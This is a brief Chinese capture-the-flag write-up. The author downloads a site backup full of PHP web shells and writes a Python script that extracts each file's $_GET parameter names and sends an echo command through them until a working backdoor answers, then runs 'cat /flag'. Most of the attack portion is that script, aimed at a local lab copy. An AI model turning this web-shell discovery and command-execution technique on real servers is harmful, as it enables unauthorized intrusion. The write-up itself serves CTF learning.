高明的黑客

进去下载www.tar.gz下了一堆shell，但试了试用不了，估计是这么多里头有一个能用吧。

写脚本跑呗。

import requests
import re
import os
import time

path = "D:\phpstudy_pro\WWW\src"
files = os.listdir(path)
url = "http://127.0.0.1/src"

reg = r'\$_GET\[\'(.*?)\'\]'
reg_lists = re.compile(reg)
gets = []
for file in files:
    position = path+'/'+file
    print("try %s" % file)
    f = open(position,'r',encoding='UTF-8')
    book = f.read()
    f = re.findall(reg_lists,book)
    for i in f:
        new_url = '{}/{}?{}={}'.format(url,file,i,'echo "get"')
        r = requests.get(new_url)
        time.sleep(0.001)
        r.encoding = 'UTF-8'
        s = r.text
        if 'get' in s:
            print(new_url)
            break

放本地，用的正则匹配，匹配出密码的，然后挨个提交输出get，最后成功的就是正确的。

然后用正确的cat /flag就行了。
